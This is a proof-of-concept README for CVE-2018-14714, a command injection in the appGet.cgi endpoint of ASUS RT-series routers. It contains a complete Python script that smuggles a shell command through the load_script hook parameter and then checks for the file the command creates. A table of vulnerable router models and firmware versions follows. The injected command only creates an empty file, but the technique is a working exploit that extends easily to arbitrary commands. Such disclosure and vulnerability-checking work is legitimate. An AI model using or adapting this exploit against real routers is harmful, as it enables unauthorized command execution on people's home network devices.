# CVE-2018-14714-POC
> Apr 25 2020, Altin Thartori, github.com/tin-z

---

## Vulnerability Details ##
System command injection in appGet.cgi on ASUS RT-AC3200 version 3.0.0.4.382.50010 allows attackers to execute system commands via the "load_script" URL parameter

References For CVE-2018-14714 :
 * [https://blog.securityevaluators.com/asus-routers-overflow-with-vulnerabilities-b111bc1c8eb8](https://blog.securityevaluators.com/asus-routers-overflow-with-vulnerabilities-b111bc1c8eb8)


### POC ###

```
#!/usr/bin/env python3
import socket
import sys
import time

HOST = sys.argv[1]
PORT = 80
if len(sys.argv) > 2 :
  PORT = int(sys.argv[2])


def header(cookie_expected=False):
  buff = ""
  buff += "Host: {}:{}\r\n".format(HOST, PORT)
  buff += "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n"
  buff += "Referer: http://{}:{}/\r\n".format(HOST, PORT)
  buff += "Accept: application/json, text/javascript, */*; q=0.01\r\n"
  buff += "Accept-Language: en-US,en;q=0.5\r\n"
  buff += "Accept-Encoding: gzip, deflate\r\n"
  buff += "X-Requested-With: XMLHttpRequest\r\n"
  if cookie_expected :
    cookie = "asus_token=AAAAAAAAAAA"
    buff += "Cookie: {}\r\n".format(cookie)
  buff += "Connection: close\r\n"
  buff += "\r\n"
  return buff


def req1(cookie_expected=False):
  buff = ""
  buff += "GET /appGet.cgi?hook=load_script(\"../bin/echo%20%26%26%20touch%20/www/emptyFile.asp\") HTTP/1.1\r\n"
  buff += header(cookie_expected)
  return buff


def req2(cookie_expected=False):
  buff = ""
  buff += "GET /emptyFile.asp HTTP/1.1\r\n"
  buff += header(cookie_expected)
  return buff


try :
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))
  s.send(req1().encode())
  time.sleep(2)
  body = s.recv(4096).decode()
  print(body)
  s.send(req2().encode())
  time.sleep(2)
  body = s.recv(4096).decode()
  if " 200 OK" not in body :
    print("[x] Good, target isn't vulnerable")
  else :
    print("[+] Target is vulnerable")
  s.close()
  print("Done")
except Exception as ex:
  print(ex.args[0])

```

### more details ###
```
Table 1. Routers vulnerable version

| Model                   | Version                   | date 
-------------------------------------------------------------------
 RT-AC1200G+              | Version 3.0.0.4.382.51129 | 2019/04/03
 RT-AC58U                 | Version 3.0.0.4.380.8347  | 2018/07/20
 RT-AC1300G+              | Version 3.0.0.4.380.8347  | 2018/07/20
 RT-AC87U                 | Version 3.0.0.4.382.50702 | 2018/07/18
 RT-AC5300                | Version 3.0.0.4.384.21140 | 2018/07/10
 ROG Rapture GT-AC5300    | Version 3.0.0.4.384.21140 | 2018/07/10
 RT-AC86U                 | Version 3.0.0.4.384.21140 | 2018/07/10
 RT-N18U                  | Version 3.0.0.4.382.50624 | 2018/06/12
 RT-AC88U                 | Version 3.0.0.4.384.21045 | 2018/06/01
 RT-AC3100                | Version 3.0.0.4.384.21045 | 2018/06/01
 RT-ACRH17                | Version 3.0.0.4.382.50470 | 2018/05/15
 RT-AC3200                | Version 3.0.0.4.382.50470 | 2018/05/15
 BRT-AC828                | Version 3.0.0.4.380.7432  | 2018/03/28
 RT-N12+ B1               | Version 3.0.0.4.380.10410 | 2018/02/09

 ...                        ,,,                         ,,,

```

